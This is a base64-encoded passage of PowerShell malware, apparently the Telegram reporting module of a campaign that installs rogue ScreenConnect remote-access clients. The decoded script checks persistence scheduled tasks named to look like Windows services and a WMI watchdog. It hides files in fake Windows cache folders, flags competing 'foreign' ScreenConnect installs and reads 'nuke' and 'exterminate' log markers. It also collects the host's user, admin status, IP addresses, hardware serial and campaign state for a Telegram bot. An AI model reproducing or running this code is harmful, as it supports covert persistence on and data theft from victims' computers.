ICAgICAgIH0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJl
dHVybiB9CiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAn
bXNpJyAkZG4KICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAg
ICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBH
ZXQtR3J5eGFLZWVwRnAgewogICAgJGZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiAgICAkcCA9ICdD
OlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5j
ZmcnCiAgICBpZiAoJFdvcmtEaXIpIHsgJHAgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNm
ZycgfQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05
YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAg
ICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIEdldC1TY0luc3RhbGxzIHsKICAg
ICRncnl4YUZwID0gR2V0LUdyeXhhS2VlcEZwCiAgICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBp
ZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBl
bHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcn
KSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxzZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUz
NDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBlbHNlaWYgKCRmcCAtZXEgJGdyeXhhRnApIHsg
J0tFRVAtR1JZWEEnIH0KICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQogICAgfQoKICAgICRy
b290cyA9IEAoCiAgICAgICAgIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGll
bnQqIiwKICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xp
ZW50KiIKICAgICkKICAgIGZvcmVhY2ggKCRwYXQgaW4gJHJvb3RzKSB7CiAgICAgICAgR2V0LUNo
aWxkSXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0
aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQogICAgICAgIH0KICAg
IH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxc
KicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRl
bVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2Jq
ZWN0IHsKICAgICAgICAgICAgJF8uRGlzcGxheU5hbWUgLWxpa2UgJypTY3JlZW5Db25uZWN0KicK
ICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRp
c3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9CiAgICAgICAg
ICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gbXNpOiA8Y29kZT57MH08L2NvZGU+IHZ7MX0nIC1mIChF
c2MgJF8uRGlzcGxheU5hbWUpLCAoRXNjICR2ZXIpKSkKICAgICAgICB9CiAgICB9CgogICAgaWYg
KCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9CiAgICBy
ZXR1cm4gJGxpc3QKfQoKJGNmZyA9IEdldC1DZmcKaWYgKC1ub3QgJGNmZy5CT1RfVE9LRU4gLW9y
IC1ub3QgJGNmZy5DSEFUX0lEKSB7CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4t
UGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAtVmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgZXhpdCAyCn0KCiRwcmltID0gJ1NjcmVlbkNvbm5l
Y3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScKJGFsdCA9ICdTY3JlZW5Db25uZWN0IENsaWVu
dCAoZjg2MWM4MTQwZDQ1MzQyNyknCiRvcyA9IEdldC1Pc0luZm8KJHdobyA9IFtTZWN1cml0eS5Q
cmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKJGVsZXYgPSAoW1Nl
Y3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZSgKICAgIFtTZWN1cml0eS5Qcmlu
Y2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikKJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScKCiRt
c2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnLm1zaScKJG1zaVNpemUgPSBpZiAoVGVz
dC1QYXRoICRtc2lDYWNoZSkgewogICAgJ3swOk4wfSBLQicgLWYgKChHZXQtSXRlbSAkbXNpQ2Fj
aGUgLUZvcmNlKS5MZW5ndGggLyAxS0IpCn0gZWxzZSB7ICdub25lJyB9CgokbW9uUGF0aCA9IEpv
aW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0
YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCIKJGhhc01v
biA9IFRlc3QtUGF0aCAkbW9uUGF0aAokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24KCiMgVDEw
OiBvbi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4
YWN0bHkgd2hhdCBpcyBpbnN0YWxsZWQKZnVuY3Rpb24gR2V0LVBheWxvYWRCdWlsZChbc3RyaW5n
XSRmaWxlKSB7CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3Np
bmcnIH0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAg
ICAgICAgaWYgKCRsIC1tYXRjaCAnQlVJTERccytcZHs4fShbQS1aXStcZCspJykgeyByZXR1cm4g
JG1hdGNoZXNbMV0gfQogICAgfQogICAgcmV0dXJuICc/Jwp9CiRiTW9uID0gR2V0LVBheWxvYWRC
dWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpCiRiU2VjID0gR2V0LVBheWxv
YWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpCiRiVGdyID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICd0Z19yZXBvcnQucHMxJykKJGJMaWIg
PSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykKCiMg
cGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9tIGlkZW50aXR5
LmNmZyB3aGVuIHByZXNlbnQKJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5j
ZmcnCiRpZE1hcCA9IEB7fQppZiAoVGVzdC1QYXRoICRpZENmZykgewogICAgR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBpZiAoJF8gLW1h
dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRtYXRjaGVzWzFd
XSA9ICRtYXRjaGVzWzJdIH0KICAgIH0KfQokZXhwZWN0ZWRUYXNrcyA9IEAoCiAgICBAeyBOYW1l
ID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19BIH0gZWxzZSB7ICdXZXJRdWV1
ZVN5bmMnIH0pOyBSb2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LAogICAg
QHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAn
UGxhU2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChjaGFp
bjEpIiB9LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tf
QyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9
LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVs
c2UgeyAnVGNwSXBDb25mbGljdFJlcycgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQop
CiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbgokd21pQyA9IEdldC1XbWlPYmpl
Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENv
bnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdh
dGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3
bWlDKSB9CgokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp
Yy5MaXN0W3N0cmluZ10KJHRhc2tPayA9IDAKJHRhc2tCYWQgPSAwCmZvcmVhY2ggKCR0IGluICRl
eHBlY3RlZFRhc2tzKSB7CiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7CiAgICAgICAg
aWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsr
OyAkbWFyayA9ICdNSVNTSU5HJyB9CiAgICAgICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7
MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNj
ICR0LlJvbGUpKSkKICAgICAgICBjb250aW51ZQogICAgfQogICAgJGggPSBHZXQtVGFza0hlYWx0
aCAkdC5OYW1lCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0aHkpIHsKICAgICAgICAk
dGFza09rKysKICAgICAgICAkbWFyayA9ICdPSycKICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1h
bmQgLW5vdCAkaC5PdXJzKSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ05P
VF9PVVJTJwogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsKICAgICAgICAkdGFza0JhZCsrCiAg
ICAgICAgJG1hcmsgPSAnV0VBSycKICAgIH0gZWxzZSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAg
ICAgICRtYXJrID0gJ01JU1NJTkcnCiAgICB9CiAgICAkZXh0cmEgPSAnJwogICAgaWYgKCRoLlBy
ZXNlbnQpIHsKICAgICAgICAkYml0cyA9IEAoKQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJp
dHMgKz0gJGguU3RhdHVzIH0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJl
c3VsdCAtbmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9CiAg
ICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywg
JykgKyAnKScgfQogICAgfQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2Rl
PnsxfTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJv
bGUpLCAoRXNjICRleHRyYSkpKQp9CgokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQokYWx0
TGluZSA9IEdldC1TdmNMaW5lICRhbHQKJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVubmlu
ZyonCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9u
CgokZW1vamlNYXAgPSBAewogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUpCiAg
ICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNkE4KSkK
ICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY3RTIp
KQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpCiAgICBGT1JDRSAgICA9IFtz
dHJpbmddKFtjaGFyXTB4MjZBMSkKICAgIERFUExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252
ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQogICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNv
bnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpCn0KJGtleSA9ICRTdGF0ZS5Ub1VwcGVySW52YXJpYW50
KCkKJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkgeyAkZW1vamlNYXBb
JGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RjEp
KSB9CgokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsKICAgICdPSycgeyAnUHJpbWFyeSBoZWFsdGh5
JyB9CiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQogICAgJ1JFU1RPUkVE
JyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9CiAgICAnRkFJTCcgeyAnSGVhbCBGQUlMRUQnIH0KICAg
ICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQogICAgJ0RFUExPWScgeyBpZiAoJGRlcGxv
eU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBO
RUVERUQnIH0gfQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9CiAgICBkZWZhdWx0IHsgIlN0
YXRlOiAkU3RhdGUiIH0KfQoKJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9sZFN0YXRlIC0+
ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0KJHNjTGlzdCA9IEdldC1TY0luc3RhbGxzCiRybW1I
aXRzID0gR2V0LVJtbUhpdHMKaWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1I
aXRzLkFkZCgnLSAobm9uZSBkZXRlY3RlZCknKSB9CgokcHViID0gR2V0LVB1YmxpY0lwCiRsYW4g
PSBHZXQtTG9jYWxJcHMKJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06
c3Mgenp6JwokdXB0aW1lID0gJ24vYScKdHJ5IHsKICAgICRib290ID0gKEdldC1DaW1JbnN0YW5j
ZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lCiAgICAkdXB0aW1lID0gJ3sw
OmRkfWQgezA6aGh9aCB7MDptbX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQp9IGNhdGNoIHt9
CgojIGNhbXBhaWduIHN0YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0
aW9uKQokc3RhdGVMaW5lID0gJ24vYScKJHN0YXRlT2JqID0gJG51bGwKJHN0YXRlUGF0aDIgPSBK
b2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIp
IHsKICAgICRyYXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIg
LVJhdykuVHJpbSgpCiAgICB0cnkgewogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENv
bnZlcnRGcm9tLUpzb24KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWln
bikgeyAoJHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQogICAgICAg
ICRzdGF0ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0
KSBmb3JlaWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3Rh
dGVPYmoudGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRl
T2JqLmluc3RhbGxDb3VudCkiCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0ZSB9
Cn0KCiRkZXBsb3lCbG9jayA9ICcnCmlmICgka2V5IC1lcSAnREVQTE9ZJykgewogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBh
dGggIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAt
bm90bWF0Y2ggKCI1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8ezB9IiAtZiAoR2V0
LUdyeXhhS2VlcEZwKSkgfSkKICAgICRkaWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xs
ZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRX
b3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAg
JGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlf
JywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywKICAgICAgICAg
ICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAn
aWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29y
cGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxsJywgJ2FsdF8nCiAgICAgICAgKQogICAgICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgJGxp
bmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlm
ICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgICAgICAgICAg
JGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2
IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0g
PGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/
JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRp
YWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0K
ICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBsb3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxi
PiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsg
J1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBt
b24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNl
IHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tz
LkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFkKQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTog
TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIg
Y3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBu
IikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8
L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9u
OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgotIFdoZW46ICQoRXNjICRub3cpCi0gU291cmNl
IGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8
L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBV
c2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4KLSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06
ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3
b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDog
PGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5PUyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVz
YyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVzYyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNj
ICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxs
RGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1
cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZh
Y3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFs
KTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFNX0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlz
a0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5l
Y3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNj
ICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQotIEdyeXhhIDxjb2RlPiQoRXNjIChHZXQtR3J5eGFLZWVwRnApKTwvY29kZT46ICQo
RXNjIChHZXQtU3ZjTGluZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdy
eXhhS2VlcEZwKSkpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJNTSAvIHJlbW90
ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9iPgotIE1TSSBj
YWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9j
b2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPgotIDxj
b2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4K
CjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPgoK
PGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAKCiMgY29tcGFj
